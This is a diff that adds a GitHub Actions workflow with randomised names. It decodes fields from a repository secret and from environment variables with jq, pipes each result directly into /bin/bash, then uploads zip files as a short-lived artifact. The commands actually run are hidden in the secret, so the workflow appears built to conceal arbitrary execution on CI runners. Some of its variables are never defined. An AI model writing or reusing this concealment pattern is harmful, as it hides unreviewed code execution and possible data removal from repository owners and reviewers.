@@ -1,0 +1,24 @@
+name: knoxmeteor3094
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: knoxmeteor3094
+        env:
+          ji9937: ${{ secrets.ji9937 }}
+        run: |
+          printf '%s' "$ji9937" | jq -r .iva4239 | /bin/bash
+          printf '%s' "$g650" | jq -r .hndxh0932 | /bin/bash
+          echo $bdu8626 | jq -r .vaho1 | /bin/bash
+          echo $hixs64 | jq -r .f59 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 175Twa7T
+          path: "*.zip"
+          retention-days: 1
